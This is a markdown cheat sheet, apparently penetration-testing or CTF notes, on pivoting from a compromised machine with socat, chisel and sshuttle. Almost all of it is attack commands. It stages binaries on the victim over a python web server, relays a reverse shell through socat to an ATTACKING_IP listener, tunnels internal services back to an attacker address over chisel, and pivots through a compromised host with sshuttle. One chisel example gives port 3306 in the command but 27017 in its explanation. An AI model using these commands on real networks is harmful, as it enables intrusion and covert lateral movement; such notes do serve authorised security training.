#### Useful binaries 
https://github.com/andrew-d/static-binaries

#### Socat 
>If we have gain access to a machine then socat can encrypted create a relay on compromised machine and we can get a reverse shell on another machine and socat forwards to our machine.
>Can be used in both linux and windows systems.
>Can be used to create encrypted port forward and relays.
```
sudo python3 -m http.server 80
Download the binary in compromised host using curl/wget.
```

##### In local machine 
>nc -nvlp 7000

##### In Compromised Machine
>./socat tcp-l:8000 tcp:ATTACKING_IP:7000 &

#### Killing Socat Connections
```
jobs
kill PID
```

#### Chisel
> Uses SOCKS5 Proxy

##### Reverse Port Forwarding with Chisel
###### In attacking machine
```
chisel server --host 10.50.102.117  -p 1234 --reverse

    server: run the server mode
    -p : port for the server to listen on
    --reverse: allows reverse port forwarding
```
###### In Compromised Machine

```
chisel client 10.50.102.117:1234 R:2222:127.0.0.1:3306/tcp

    client : run the client mode
    10.50.102.117:1234 : the IP address of the attacker’s machine and the port that was specified in the chisel server command
    R:2222:127.0.0.1:27017/tcp: the R means we want to perform a reverse port forward; 2222 is the port number we want to use to route traffic through on the attacker’s machine; 127.0.0.1:27017 is the IP address/port we want to route our traffic to on the client’s machine; /tcp means we want to use the TCP protocol.
```
>The previous commands will allow us to access the service running locally on the remote machine on port 2222 on the attacking machine.

##### Forward Port Forwarding with Chisel 

###### In Compromised Host
```
./chisel server -p LISTEN_PORT --socks5
```

###### In Attacking Box

```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```

#### SSHuttle
```
sshuttle -r user@10.10.10.10 --ssh-cmd "ssh -i private_key" 10.10.10.0/24
```
##### Exclude the compromised Host 
```
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
```
